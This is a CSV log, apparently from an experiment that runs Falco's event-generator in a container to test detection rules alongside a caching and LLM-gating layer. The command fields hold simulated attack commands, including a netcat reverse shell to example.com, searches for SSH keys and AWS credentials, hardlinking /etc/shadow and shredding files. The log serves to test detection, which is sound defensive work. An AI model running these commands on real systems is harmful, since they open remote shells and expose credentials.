timestamp,event_type,rule_name,priority,prompt_tokens,completion_tokens,latency_ms,remediation_status,remediation_action,mitre_technique,target_container,attack_source,attack_label,attack_id,container_id,container_image,event_source,experiment_mode,ground_truth,rule_matched,llm_called,cache_hit,cache_key,gate_decision,llm_action,llm_threat_level,cache_ttl
2026-05-17T11:48:16.967521,cache-hit,PTRACE anti-debug attempt,Notice,0,0,0,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,1e39dfc23dcf83ae7a47a9666599847c,cache-hit,alert,high,3600
2026-05-17T11:48:18.546834,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:48:20.125356,cache-hit,Search Private Keys or Passwords,Warning,0,0,0,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,3a08e749a190242c74492afdfc1de468,cache-hit,alert,medium,3600
2026-05-17T11:48:21.703914,cache-hit,Directory traversal monitored file read,Warning,0,0,0,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6b25374d77be2bccc3489c6473bdb223,cache-hit,alert,medium,3600
2026-05-17T11:48:23.293954,cache-hit,PTRACE anti-debug attempt,Notice,0,0,0,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,1e39dfc23dcf83ae7a47a9666599847c,cache-hit,alert,high,3600
2026-05-17T11:48:24.873740,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:48:26.453233,cache-hit,Search Private Keys or Passwords,Warning,0,0,0,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,3a08e749a190242c74492afdfc1de468,cache-hit,alert,medium,3600
2026-05-17T11:48:28.033622,cache-hit,Directory traversal monitored file read,Warning,0,0,0,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6b25374d77be2bccc3489c6473bdb223,cache-hit,alert,medium,3600
2026-05-17T11:48:29.612499,cache-hit,Read sensitive file trusted after startup,Warning,0,0,0,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b7d41082564995db77d6b74b75a4f3d2,cache-hit,alert,medium,3600
2026-05-17T11:48:31.191289,cache-hit,Disallowed SSH Connection Non Standard Port,Notice,0,0,0,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,629494c6c6d948ac631c427d8d609862,cache-hit,pause,medium,3600
2026-05-17T11:48:32.770579,cache-hit,Find AWS Credentials,Warning,0,0,0,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b95c830e335267463f9a43857f2ed885,cache-hit,alert,high,3600
2026-05-17T11:48:34.350498,cache-hit,Remove Bulk Data from Disk,Warning,0,0,0,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-1056880682,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6c972ecf189eefa9be9e4d28f665b944,cache-hit,alert,medium,3600
2026-05-17T11:48:35.954055,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-q7s62N.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,3600
2026-05-17T11:48:37.535526,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-q7s62N.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,3600
2026-05-17T11:48:39.114933,cache-hit,Clear Log Activities,Warning,0,0,0,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,357658d27e05316e491368365302d386,cache-hit,alert,medium,3600
2026-05-17T11:48:40.691679,cache-hit,Create Symlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-685563460/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,aa21b1177c801979bea62a239e056977,cache-hit,alert,high,3600
2026-05-17T11:48:42.269087,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:48:43.851013,cache-hit,Packet socket created in container,Notice,0,0,0,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,50444a11263ba4bdc942b447dce33e70,cache-hit,pause,medium,3600
2026-05-17T11:48:45.431433,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:48:47.009899,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:48:48.588587,cache-hit,Fileless execution via memfd_create,Critical,0,0,0,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ed1d903fc003a9a58bc1a53dc4c8ee7d,cache-hit,alert,high,3600
2026-05-17T11:48:50.168209,cache-hit,Create Hardlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-861507121/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ce29cc75814d17294a676363d10f7622,cache-hit,alert,high,3600
2026-05-17T11:48:51.759033,cache-hit,System user interactive,Informational,0,0,0,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,256d745947e9b7d7eae333d0ebd169e3,cache-hit,alert,high,3600
2026-05-17T11:48:53.339122,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:48:54.918376,cache-hit,Packet socket created in container,Notice,0,0,0,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,50444a11263ba4bdc942b447dce33e70,cache-hit,pause,medium,3600
2026-05-17T11:48:56.501346,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:48:58.079069,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:48:59.661398,cache-hit,Fileless execution via memfd_create,Critical,0,0,0,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ed1d903fc003a9a58bc1a53dc4c8ee7d,cache-hit,alert,high,3600
2026-05-17T11:49:01.243045,cache-hit,Create Hardlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-3659591051/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ce29cc75814d17294a676363d10f7622,cache-hit,alert,high,3600
2026-05-17T11:49:02.821543,cache-hit,System user interactive,Informational,0,0,0,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,256d745947e9b7d7eae333d0ebd169e3,cache-hit,alert,high,3600
2026-05-17T11:49:04.400207,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:49:05.978719,cache-hit,PTRACE anti-debug attempt,Notice,0,0,0,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,1e39dfc23dcf83ae7a47a9666599847c,cache-hit,alert,high,3600
2026-05-17T11:49:07.575661,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:49:09.155108,cache-hit,Search Private Keys or Passwords,Warning,0,0,0,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,3a08e749a190242c74492afdfc1de468,cache-hit,alert,medium,3600
2026-05-17T11:49:10.733840,cache-hit,Directory traversal monitored file read,Warning,0,0,0,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6b25374d77be2bccc3489c6473bdb223,cache-hit,alert,medium,3600
2026-05-17T11:49:12.311547,cache-hit,Read sensitive file trusted after startup,Warning,0,0,0,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b7d41082564995db77d6b74b75a4f3d2,cache-hit,alert,medium,3600
2026-05-17T11:49:13.890218,cache-hit,Disallowed SSH Connection Non Standard Port,Notice,0,0,0,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,629494c6c6d948ac631c427d8d609862,cache-hit,pause,medium,3600
2026-05-17T11:49:15.472683,cache-hit,Find AWS Credentials,Warning,0,0,0,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b95c830e335267463f9a43857f2ed885,cache-hit,alert,high,3600
2026-05-17T11:49:17.052357,cache-hit,Remove Bulk Data from Disk,Warning,0,0,0,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-3977651963,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6c972ecf189eefa9be9e4d28f665b944,cache-hit,alert,medium,3600
2026-05-17T11:49:18.631873,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-D0PiMF.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,3600
2026-05-17T11:49:20.209830,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-D0PiMF.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,3600
2026-05-17T11:49:21.797856,cache-hit,Clear Log Activities,Warning,0,0,0,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,357658d27e05316e491368365302d386,cache-hit,alert,medium,3600
2026-05-17T11:49:23.377907,cache-hit,Create Symlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-4097235232/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,aa21b1177c801979bea62a239e056977,cache-hit,alert,high,3600
2026-05-17T11:49:24.956654,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:49:26.537065,cache-hit,Create Hardlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-3611764846/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ce29cc75814d17294a676363d10f7622,cache-hit,alert,high,3600
2026-05-17T11:49:28.116744,cache-hit,System user interactive,Informational,0,0,0,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,256d745947e9b7d7eae333d0ebd169e3,cache-hit,alert,high,3600
2026-05-17T11:49:29.694679,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:49:31.276649,cache-hit,PTRACE anti-debug attempt,Notice,0,0,0,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,1e39dfc23dcf83ae7a47a9666599847c,cache-hit,alert,high,3600
2026-05-17T11:49:32.856028,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:49:34.436713,cache-hit,Search Private Keys or Passwords,Warning,0,0,0,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,3a08e749a190242c74492afdfc1de468,cache-hit,alert,medium,3600
2026-05-17T11:49:36.016294,cache-hit,Directory traversal monitored file read,Warning,0,0,0,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6b25374d77be2bccc3489c6473bdb223,cache-hit,alert,medium,3600
2026-05-17T11:49:37.607734,cache-hit,Read sensitive file trusted after startup,Warning,0,0,0,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b7d41082564995db77d6b74b75a4f3d2,cache-hit,alert,medium,3600
2026-05-17T11:49:39.208305,cache-hit,Disallowed SSH Connection Non Standard Port,Notice,0,0,0,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,629494c6c6d948ac631c427d8d609862,cache-hit,pause,medium,3600
2026-05-17T11:49:40.787575,cache-hit,Find AWS Credentials,Warning,0,0,0,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b95c830e335267463f9a43857f2ed885,cache-hit,alert,high,3600
2026-05-17T11:49:42.376331,cache-hit,Remove Bulk Data from Disk,Warning,0,0,0,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-3880705581,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6c972ecf189eefa9be9e4d28f665b944,cache-hit,alert,medium,3600
2026-05-17T11:49:43.955180,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-1qET8z.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,3600
2026-05-17T11:49:45.536373,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-1qET8z.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,3600
2026-05-17T11:49:47.115124,cache-hit,Clear Log Activities,Warning,0,0,0,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,357658d27e05316e491368365302d386,cache-hit,alert,medium,3600
